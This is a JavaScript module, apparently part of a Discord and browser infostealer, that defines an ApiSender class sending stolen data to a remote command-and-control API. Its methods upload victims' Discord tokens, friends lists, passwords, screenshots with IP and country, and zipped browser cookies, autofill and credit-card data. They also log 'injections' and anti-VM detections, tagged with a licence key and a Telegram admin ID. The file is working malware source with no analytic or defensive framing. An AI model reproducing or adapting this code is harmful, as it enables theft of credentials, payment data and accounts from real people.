Object.defineProperty(exports, "__esModule", {
  value: true
});
const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");
const Logger = require("../utils/Logger.js");
class ApiSender {
  constructor(adminID, licenseKey, hwid, baseURL) {
    if (!adminID || !licenseKey || !hwid) throw new Error("❌ Eksik parametre: adminID, licenseKey ve hwid zorunludur.");
    this.adminID = adminID;
    this.licenseKey = licenseKey;
    this.hwid = hwid;
    this.api = axios.create({
      baseURL,
      headers: {
        "x-license-key": this.licenseKey,
        "x-tg-id": this.adminID,
        "x-hwid": this.hwid,
        "Content-Type": "application/json"
      }
    });
  }
  async reportDiscordData(tokens) {
    try {
      Logger.logger.info("Reporting Discord tokens to API...");
      const response = await this.api.post("/api/v1/discord/tokens/report", {
        tokens,
        hwid: this.hwid,
        admin: this.adminID
      });
      Logger.logger.info("Discord tokens reported successfully.");
      return response.data;
    } catch (error) {
      Logger.logger.error("Failed to report Discord tokens:", error);
      return {
        success: false,
        error: error.message
      };
    }
  }
  async reportDiscordFriends(friendsList) {
    try {
      Logger.logger.info("Reporting Discord friends list to API...");
      const response = await this.api.post("/api/v1/discord/friends/report", {
        friendsList,
        hwid: this.hwid,
        admin: this.adminID
      });
      Logger.logger.info("Discord friends list reported successfully.");
      return response.data;
    } catch (error) {
      Logger.logger.error("Failed to report Discord friends list:", error);
      return {
        success: false,
        error: error.message
      };
    }
  }
  async registerInject(details) {
    try {
      Logger.logger.info("Registering injection with API...");
      const response = await this.api.post("/api/v1/discord/clients/register", {
        ...details,
        hwid: this.hwid,
        admin: this.adminID
      });
      Logger.logger.info("Injection registered successfully.");
      return response.data;
    } catch (error) {
      Logger.logger.error("Failed to register injection:", error);
      return {
        success: false,
        error: error.message
      };
    }
  }
  async reportAntiVM(details) {
    try {
      Logger.logger.info("Reporting Anti-VM detection...");
      const response = await this.api.post("/api/v1/anti-vm/report", {
        ...details,
        hwid: this.hwid,
        admin: this.adminID
      });
      Logger.logger.info("Anti-VM detection reported successfully.");
      return response.data;
    } catch (error) {
      Logger.logger.error("Failed to report Anti-VM detection:", error);
      return {
        success: false,
        error: error.message
      };
    }
  }
  async reportPasswordData(details) {
    try {
      Logger.logger.info("Reporting extra password data...");
      const response = await this.api.post("/api/v1/passwords/report", details);
      Logger.logger.info("Extra password data reported successfully.");
      return response.data;
    } catch (error) {
      Logger.logger.error("Failed to report password data:", error);
      return {
        success: false,
        error: error.message
      };
    }
  }
  async captureScreenshot(image, details) {
    try {
      Logger.logger.info("Uploading screenshot to API...");
      const response = await this.api.post("/api/v1/capture/submit", {
        image,
        username: details.username,
        ip: details.ip,
        country: details.country
      });
      Logger.logger.info("Screenshot uploaded successfully.");
      return response.data;
    } catch (error) {
      Logger.logger.error("Failed to upload screenshot:", error);
      return {
        success: false,
        error: error.message
      };
    }
  }
  async reportBrowserData(details, zipFile) {
    try {
      Logger.logger.info("Reporting browser data with zip: " + zipFile);
      const form = new FormData();
      if (fs.existsSync(zipFile)) form.append("logs", fs.createReadStream(zipFile));else Logger.logger.warn("Zip file for browser data report not found!");
      form.append("username", details.username || "Unknown");
      for (const key of ["cookies", "passwords", "history", "bookmarks", "autofill", "creditCards"]) form.append(key, String(details[key] || 0));
      form.append("size", details.size || "0 MB");
      form.append("ip", details.ip || "0.0.0.0");
      form.append("country", details.country || "Unknown");
      form.append("antiVirus", details.antiVirus || "None");
      form.append("ram", details.ram);
      form.append("uptime", details.uptime);
      form.append("hwid", this.hwid);
      form.append("admin", this.adminID);
      const response = await this.api.post("/api/v1/exfiltrations/submit", form, {
        headers: {
          ...form.getHeaders(),
          "Content-Type": "multipart/form-data"
        },
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      });
      Logger.logger.info("Browser data reported successfully.");
      return response.data;
    } catch (error) {
      Logger.logger.error("Failed to report browser data:", error);
      return {
        success: false,
        error: error.message
      };
    }
  }
  async uploadLogs(filename) {
    try {
      if (!fs.existsSync(filename)) throw new Error("Dosya bulunamadı.");
      const form = new FormData();
      form.append("logs", fs.createReadStream(filename));
      const response = await this.api.post("/api/v1/exfiltrations/submit", form, {
        headers: {
          ...form.getHeaders()
        }
      });
      return response.data;
    } catch (error) {
      return {
        success: false,
        error: error.message
      };
    }
  }
}
exports.ApiSender = ApiSender;
